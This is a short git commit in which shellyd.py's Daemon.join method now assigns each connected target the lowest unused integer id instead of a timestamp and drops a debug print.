9a5a198851c2725222a56dbb49f7c345c430a8dc
Vaughn Woerpel <vaughnwoerpel@gmail.com>
2023-10-15 13:09:49 -0400

    GOT PIPES WORKING

--- shellyd.py
+++ shellyd.py
@@ -22,10 +22,9 @@ class Daemon(Host):
     def join(self, shellpack):
         targets = self.db.all()
         ids = [target.id for target in targets]
-        print(next(filterfalse(set(ids).__contains__, count(1))))
 
         target = {
-            "id": round(time.time()),
+            "id": next(filterfalse(set(ids).__contains__, count(1))),
             "ip": shellpack['ip'],
             "location": shellpack['data'].decode(),
             "status": "CONNECTED"
